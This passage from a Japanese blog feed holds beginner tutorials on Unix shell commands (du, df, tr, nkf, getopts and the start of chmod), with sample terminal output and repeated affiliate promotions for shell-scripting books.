をつけると、ディレクトリ内のサブディレクトリごとの使用量が表示されます。 du -h -s * のひとかたまりで覚えるのがポイントです。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-13T13:28:32+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-13-01-du-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-13-01-du-suzuki/","title":"（１５）【du】シェルスクリプトコマンド活用紹介"},{"content":"dfコマンド ディスクの空き容量を調べる dfコマンド概要 「df」は、ディスクの空き領域（freeスペース）のサイズを集計して表示するコマンドです。引数でファイルやディレクトリを指定すると、そのファイルが保存されている場所の空き領域が表示されます。指定しなかった場合は、現在マウントされている全ての場所について空き領域を表示します。\nヒント dfコマンドで最も使われるオプションは -h です。この一つだけを覚えていれば大丈夫です。 dfコマンドの書式 df [オプション] [ファイル]\ndfコマンドの主なオプション オプション 意味 -h サイズに応じて読みやすい単位で表示する dfコマンド詳細説明 ディスクの空き容量を調べる 簡単です。\n$ df -h Filesystem Size Used Avail Capacity iused ifree %iused Mounted on /dev/disk1s1 466Gi 398Gi 64Gi 87% 2377176 9223372036852398631 0% / devfs 194Ki 194Ki 0Bi 100% 671 0 100% /dev /dev/disk1s4 466Gi 3.0Gi 64Gi 5% 5 9223372036854775802 0% /private/var/vm map -hosts 0Bi 0Bi 0Bi 100% 0 0 100% /net map auto_home 0Bi 0Bi 0Bi 100% 0 0 100% /home ヒント 要するに空き容量を確認するためのコマンドがdfで、-hオプションを付けることによって、サイズがわかりやすくなる、という仕組みです。深く考えるのはやめましょう。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-13T13:01:11+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-13-01-df-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-13-01-df-suzuki/","title":"（１４）【df】シェルスクリプトコマンド活用紹介"},{"content":"trコマンド 文字を置換する 大文字／小文字を変換する 改行を除去する 固定長のデータをタブ区切りに変換する／カンマ区切りに変換する trコマンド概要 「tr」は、文字を置き換えるためのコマンドです。指定した文字を別の文字に置き換えたり、指定した文字を削除したり、文字が連続している場合には1つにまとめたりすることもできます。\nですが、sedでもっと細かく制御できるので、trは「改行を除去する」ためのコマンドに成り果ててしまいました。ここでは改行を除去することだけにフォーカスしてご説明します。\ntrコマンドの書式 tr [オプション] 文字セット1 [文字セット2]\ntrコマンドの主なオプション オプション 意味 -d \u0026lsquo;文字\u0026rsquo;を削除する trコマンド詳細説明 文字を置換する sedを使いましょう。\n$ tr 012 abc ヒント 012 という文字列を置き換えるのではなく、0をaに、1をbに、2をcに置き換えます。 大文字／小文字を変換する sedを使いましょう。\n大文字／小文字を変換する\n$ tr ABC abc ヒント ABC という文字列を置き換えるのではなく、Aをaに、Bをbに、Cをcに置き換えます。 また、文字を範囲で指定することも可能です。「tr A-Z a-z」で「A」は「a」に、「B」は「b」に……と対応する文字に置き換えられます。\n$ tr A-Z a-z 改行を除去する 「-d」オプションで、指定した文字を削除することができます。\nファイル中の改行を除去\n$ cat sample.txt | tr -d \u0026#39;\\n\u0026#39; \u0026gt; 出力ファイル名 文字列中の改行を除去\n$ echo \u0026#34;$string_sample\u0026#34; | tr -d \u0026#39;\\n\u0026#39; ヒント trコマンドの唯一の利点、sedより優れているただ一つの機能、それが tr -d \u0026lsquo;\\n\u0026rsquo; です。 重要 tr -d \u0026lsquo;\\n\u0026rsquo; のくくりはシングルクォーテーションである必要があります。ダブルクォーテーションではいけません。理由は「文字列」ではなく「文字（一文字）」しか扱えないからです。 固定長のデータをタブ区切りに変換する／カンマ区切りに変換する ls -la コマンドで普通に出力します。\n$ ls -la drwxr-xr-x 13 suzukiiichiro staff 416 7 14 13:31 ./ drwxrwxrwx+ 48 suzukiiichiro staff 1536 7 5 10:05 ../ drwxrwxrwx 7 suzukiiichiro staff 224 4 10 2020 AI_Algorithm_Game_Bash/ drwxrwxrwx 18 suzukiiichiro staff 576 4 10 2020 AI_Algorithm_Game_Chess/ drwxrwxrwx 39 suzukiiichiro staff 1248 4 10 2020 AI_Algorithm_Game_Othello/ drwxrwxrwx 31 suzukiiichiro staff 992 4 10 2020 AI_Algorithm_Game_RubiksCube/ drwxrwxrwx 33 suzukiiichiro staff 1056 4 10 2020 AI_Algorithm_Game_Shogi/ drwxrwxrwx 7 suzukiiichiro staff 224 4 10 2020 C_Othello/ 連続した空白をタブに変換します。\n$ ls -l | tr -s \u0026#34; \u0026#34; \u0026#34;\\t\u0026#34; total\t528 drwxrwxrwx\t7\tsuzukiiichiro\tstaff\t224\t4\t10\t2020\tAI_Algorithm_Game_Bash/ drwxrwxrwx\t18\tsuzukiiichiro\tstaff\t576\t4\t10\t2020\tAI_Algorithm_Game_Chess/ drwxrwxrwx\t39\tsuzukiiichiro\tstaff\t1248\t4\t10\t2020\tAI_Algorithm_Game_Othello/ drwxrwxrwx\t31\tsuzukiiichiro\tstaff\t992\t4\t10\t2020\tAI_Algorithm_Game_RubiksCube/ drwxrwxrwx\t33\tsuzukiiichiro\tstaff\t1056\t4\t10\t2020\tAI_Algorithm_Game_Shogi/ drwxrwxrwx\t7\tsuzukiiichiro\tstaff\t224\t4\t10\t2020\tC_Othello/ 連続した空白をカンマに変換します。\n$ ls -l | tr -s \u0026#34; \u0026#34; \u0026#34;,\u0026#34; drwxrwxrwx,7,suzukiiichiro,staff,224,4,10,2020,AI_Algorithm_Game_Bash/ drwxrwxrwx,18,suzukiiichiro,staff,576,4,10,2020,AI_Algorithm_Game_Chess/ drwxrwxrwx,39,suzukiiichiro,staff,1248,4,10,2020,AI_Algorithm_Game_Othello/ drwxrwxrwx,31,suzukiiichiro,staff,992,4,10,2020,AI_Algorithm_Game_RubiksCube/ drwxrwxrwx,33,suzukiiichiro,staff,1056,4,10,2020,AI_Algorithm_Game_Shogi/ drwxrwxrwx,7,suzukiiichiro,staff,224,4,10,2020,C_Othello/ 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-08T11:17:58+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-08-01-tr-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-08-01-tr-suzuki/","title":"（１３）【tr】シェルスクリプトコマンド活用紹介"},{"content":"nkfコマンド 文字コードと改行コードを変換する 文字コードを判定する 文字コードを変換してファイルを書き換える CentOS 7にnkfをインストールするには？ nkfコマンド概要 「nkf」は「Network Kanji Filter」の略で、LinuxとWindowsなど、異なるOS間でテキストデータを交換する際に問題となる文字コードと改行コードを変換するためのコマンドです。\nnkfコマンドの書式 nkf [オプション] [ファイル]\nnkf [オプション] \u0026ndash;overwrite ファイル\nnkfコマンドの主なオプション nkfにはオプションはありません。なお、オプション文字列の先頭に「:」記号を入れるかどうかによって、エラーメッセージ表示の有無を変更できます。\nオプション 意味 -j(入力は J) JISコードを出力する -e(入力は E) EUCコードを出力する -s(入力は S) シフトJISコードを出力する -w(入力は W) UTF-8コードを出力する（BOMなし） -Lu 改行をLFにする（UNIX系） -g 自動判別の結果を出力する \u0026ndash;overwrite ファイルを変換して上書きする ヒント UTF-8に変換する場合は $ nkf -wLu となります。\nこのオプションの意味は、改行コードをUNIX系のLFに変換してUTF-8で出力、です。 ヒント 一覧のオプションは一部です。 $ man nkf などで、nkfの使い方を確認してください。 nkfコマンド詳細説明 文字コードと改行コードを変換する kfは「nkf ファイル名」で指定したファイル、または標準入力から受け取った内容を変換して、標準出力に書き出します。\nLinux環境で扱いやすいように、文字コードを「UTF-8」（-wオプション）、改行コードを「LF」（-Luオプション）に変換するには、リダイレクトするか、「nkf -wLu 元ファイル \u0026gt; 保存ファイル名」のように指定します。なお、入力側の文字コードは自動で判定されます。\n改行コードはUNIX系のLFで、UTF-8で変換出力\n$ cat sjisFile.txt | nkf -wLu \u0026gt; 保存ファイル名.txt 文字コードを判定する 「-g（\u0026ndash;guess）」オプションを付けると、使用されている文字コードと改行コードの判定結果を表示することができます。\n得体のしれないファイルを調査する\n$ cat sjisFile.txt | nkf -g sjisFile.txt: UTF-8 (LF) 文字コードを変換してファイルを書き換える 「\u0026ndash;overwrite」オプションでは、指定したファイルの文字コードを変換して、直接書き換えることができます。\n文字コードを変換してファイルを書き換える\n$ cat sjisFile.txt | nkf -wLu --overwrite ヒント \u0026ndash;overwrite オプションで元のファイルを上書きするのは一見便利なオプションに見えますが、別ファイルに出力して、元のファイルは極力残すようにしておくべきだと思います。僕は。 CentOS 7にnkfをインストールするには？ rpmでインストール\n$ yum localinstall http://mirror.centos.org/centos/6/os/x86_64/Packages/nkf-2.0.8b-6.2.el6.x86_64.rpm ソースからインストール\n$ wget https://osdn.jp/dl/nkf/nkf-2.1.4.tar.gz $ tar -xzvf nkf-2.1.4.tar.gz $ cd nkf-2.1.4/ $ make $ sudo make install ヒント rpmやyumでインストールする場合と、ソースからインストールする場合、いずれも好みです。人それぞれのやり方や考え方でいいと思います。いずれ使い分けができるようになると思います。今はうまく行ったほうで頑張ってください。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-08T10:22:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-08-01-nkf-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-08-01-nkf-suzuki/","title":"（１２）【nkf】シェルスクリプトコマンド活用紹介"},{"content":"getoptsコマンド オプションを解析する エラーメッセージを表示しない 引数付きのオプションを使用する getoptsコマンド概要 「getopts」は、bashのシェルスクリプト内でオプションを解析する際に役立つコマンドです。自作のシェルスクリプトで「-a」のような「ハイフン＋アルファベット1文字」のオプションを扱う際に便利です。「-f ファイル名」のように引数を取るオプションも解析できます。\n例えばこういうのです\n$ head -n10 文字列を渡すこともできます\n$ grep -f wordlist.txt ということで、自作のスクリプトでこういう事ができるわけです。\n$ myScript.sh -n10 -f addressList.txt ヒント getoptsとよく似た名前で用途も同じ「getopt」コマンド（/usr/bin/getopt）があります。getoptコマンドはgetoptsとは異なり、「\u0026ndash;」から始まるロングオプションも扱うことができます。 getoptsコマンドの書式 getopts オプション文字列 変数名\ngetoptsコマンドの主なオプション getoptsにはオプションはありません。なお、オプション文字列の先頭に「:」記号を入れるかどうかによって、エラーメッセージ表示の有無を変更できます。\nオプション 意味 : エラーメッセージの表示の有無 ヒント 一覧のオプションは一部です。 $ man getopts などで、getoptsの使い方を確認してください。 getoptsコマンド詳細説明 オプションを解析する オプション「-a」「-b」「-c」を使用し、それぞれのオプションに応じてメッセージを表示します。\n#!/bin/bash while getopts abc OPT; do case $OPT in a) echo \u0026#34;[-a] が指定された\u0026#34;;; b) echo \u0026#34;[-b] が指定された\u0026#34;;; c) echo \u0026#34;[-c] が指定された\u0026#34;;; *) echo \u0026#34;該当なし OPT=$OPT \u0026#34;;; esac done while getopts abc OPT; do\nの abc は、オプションの種類が a,b,cの３種類あることを明示的に指定しています。\nOPTは $OPT変数で、 a,b,cがそれぞれ順に代入されます。\n$ bash getopts.sh -a [-a] が指定された $ bash getopts.sh -ab [-a] が指定された [-b] が指定された $ bash getopts.sh -a -b [-a] が指定された [-b] が指定された $ bash getopts.sh -abc -d [-a] が指定された [-b] が指定された [-c] が指定された $ bash getopts.sh -abc -d [-a] が指定された [-b] が指定された [-c] が指定された getopts.sh: 不正なオプションです -- d 該当なし OPT=? 以下のオプションは用意されていないことからエラー表示となります。\n$ bash getopts.sh -abc -d [-a] が指定された [-b] が指定された [-c] が指定された getopts.sh: 不正なオプションです -- d 該当なし OPT=? エラーメッセージを表示しない getoptsに指定していないオプションを使用すると、画面1のように「不正なオプションです \u0026ndash; d」、あるいは「illegal option \u0026ndash; d」のようなメッセージを表示します。\nこのようなgetoptsのエラーメッセージを表示したくない場合は、「getopts :abc OPT」のように、オプション文字列の先頭に「:」記号を入れます。\n#!/bin/bash while getopts :abc OPT; do case $OPT in a) echo \u0026#34;[-a] が指定された\u0026#34;;; b) echo \u0026#34;[-b] が指定された\u0026#34;;; c) echo \u0026#34;[-c] が指定された\u0026#34;;; *) echo \u0026#34;該当なし OPT=$OPT \u0026#34;;; esac done エラーが表示される getopts01.sh\n$ bash getopts01.sh -abc -d [-a] が指定された [-b] が指定された [-c] が指定された getopts01: 不正なオプションです -- d 該当なし OPT=? エラーが表示されない getopts02.sh\n$ bash getopts02.sh -abc -d [-a] が指定された [-b] が指定された [-c] が指定された 該当なし OPT=? 引数付きのオプションを使用する 「-f ファイル名」のように、引数を取るオプションを解析したい場合は、オプション文字の後に「:」記号を付けます。オプションの引数は、組み込み変数「OPTARG」で参照できます。\n#!/bin/bash while getopts :a:bc: OPT; do case $OPT in a) echo \u0026#34;[-a] が指定された(引数=$OPTARG)\u0026#34;;; b) echo \u0026#34;[-b] が指定された\u0026#34;;; c) echo \u0026#34;[-c] が指定された(引数=$OPTARG)\u0026#34;;; :) echo \u0026#34;$OPTARGに引数が指定されていません\u0026#34;;; ?) echo \u0026#34;$OPTARGは定義されていません\u0026#34;;; esac done 実行結果\n$ bash getopts03.sh -a filename -b -c 100 [-a] が指定された 引数=filename [-b] が指定された [-c] が指定された 引数=100 $ 解説\n:a:bc:　について\n:a エラー表示をしないというオプションとなります。 a: -a が指定された場合は引数に数値または文字列を受け取ります。 c: -c が指定された場合は引数に数値または文字列を受け取ります。 ヒント アホか。というくらいまぎらわしくてわかりにくい設計で笑えます。一体どこの誰がこんなわかりにくい仕様にしたのでしょう。 ヒント とにかくシェルクスクリプトで起動パラメータを設定することができました。便利なツールをたくさん作ってください。では 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-07T11:27:03+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-07-01-getopts-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-07-01-getopts-suzuki/","title":"（１１）【getopts】シェルスクリプトコマンド活用紹介"},{"content":"chmodコマンド パーミッションを表すアルファベットと数値の意味 パーミッションを変更する パーミッションの変更内容を確認するには？ chmodコマンド概要 ファイルやディレクトリにアクセスできるかどうかは、ファイルの「パーミッション（許可属性）」によって決まります。このパーミッションを変更するコマンドが「chmod」です。\nchmodコマンドの書式 chmod [オプション] モード ファイル1 ファイル2 ファイル3……\nchmodコマンドの主なオプション オプション 意味 -R ファイルとディレクトリを再帰的に変更する -v 処理した内容を出力する -c 変更が行われた場合のみ処理内容を出力する -f ほとんどのエラーメッセージを出力しない ヒント 一覧のオプションは一部です。 $ man chmod などで、chmodの使い方を確認してください。 chmodコマンド詳細説明 パーミッションを表すアルファベットと数値の意味 記号 数字 意味 r 4 読み w 2 書き x 1 実行 - 0 拒否 具体的に以下のように表示される場合、「所有者」「所有グループ」「それ以外」の３桁で表されます。\nrw-rw-r\u0026ndash; 664\nrwxr-xr-x 755\nすくなくとも自分自身はおおむね「所有者」となりますので、\nrw-rw-r\u0026ndash; 664\nの場合は、所有者（自分自身）は、rw- 6 ですので、\n読み・書きはできるものの実行はできない（実行の必要がない）ファイル・ディレクトリということになります。\nrwxr-xr-x 755\nの場合は、所有者（自分自身）は、rwx 7 